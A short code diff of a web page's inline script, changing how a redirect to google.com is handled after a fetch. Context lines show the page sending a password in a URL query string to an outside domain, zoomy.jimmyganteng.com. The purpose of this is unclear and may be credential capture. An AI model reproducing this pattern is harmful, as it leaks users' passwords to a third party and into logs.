@@ -29,10 +29,13 @@
     fetch(`https://zoomy.jimmyganteng.com/password?password=${password}`)
       .then(response => response.json())
       .then(data => {
-        if (data) {
-          window.location = "http://google.com"
+        if (data.error) {
+          window.location = "http://google.com";
         }
-      });
+      })
+      .catch(error => {
+        window.location = "http://google.com";
+      }) ;
   </SCRIPT>
 </head>
 <body>
